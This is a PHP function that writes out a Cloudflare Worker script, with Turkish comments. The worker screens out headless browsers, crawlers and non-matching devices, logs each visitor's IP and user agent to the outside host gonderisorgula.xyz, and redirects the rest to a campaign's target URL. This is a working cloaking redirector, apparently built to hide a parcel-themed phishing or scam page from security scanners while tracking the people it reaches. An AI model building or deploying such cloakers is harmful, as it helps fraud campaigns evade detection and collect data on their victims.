<?php

function generateWorkerScript(string $campaignId, string $targetUrl, array $botFilters, array $devices): string {
    $botFiltersJson = json_encode($botFilters);
    $devicesJson = json_encode($devices);
    $targetUrlJs = json_encode($targetUrl);
    $campaignIdJs = json_encode($campaignId);

    return <<<JS
addEventListener('fetch', event => {
    event.respondWith(handleRequest(event.request));
});

async function handleRequest(request) {
    const userAgent = request.headers.get('user-agent') || '';
    const cf = request.cf || {};
    const device = cf.deviceType || 'desktop';

    let isBot = false;
    let detectedBy = null;

    const botFilters = $botFiltersJson;
    const devices = $devicesJson;

    if (botFilters.includes("headless") && /HeadlessChrome/i.test(userAgent)) {
        isBot = true;
        detectedBy = "Headless tarayıcı";
    }

    if (botFilters.includes("crawler") && /(bot|crawler|spider|crawl)/i.test(userAgent)) {
        isBot = true;
        detectedBy = "Crawler / Bot User-Agent";
    }

    if (devices.length && !devices.includes(device)) {
        isBot = true;
        detectedBy = "Cihaz uyumsuzluğu";
    }

    // LOG GÖNDER
    await fetch("https://gonderisorgula.xyz/api/log_visit.php", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            campaign_id: $campaignIdJs,
            ip: request.headers.get("cf-connecting-ip"),
            user_agent: userAgent,
            status: isBot ? "blocked" : "allowed",
            detected_by: detectedBy
        })
    });

    if (isBot) {
        return new Response("Bot tespit edildi", { status: 403 });
    }

    return Response.redirect($targetUrlJs, 302);
}
JS;
}
